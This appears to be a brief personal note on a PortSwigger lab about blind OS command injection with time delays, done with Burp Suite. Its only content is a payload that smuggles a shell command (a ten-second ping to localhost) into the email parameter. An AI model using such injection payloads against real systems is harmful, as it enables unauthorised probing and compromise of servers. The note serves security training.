# Blind OS command injection with time delays

Source: Portswigger
Tools: Burpsuite
Technique: Blind, OS Command Injection
Fields: Web

- email parameter’s value → email=x||ping+-c+10+127.0.0.1||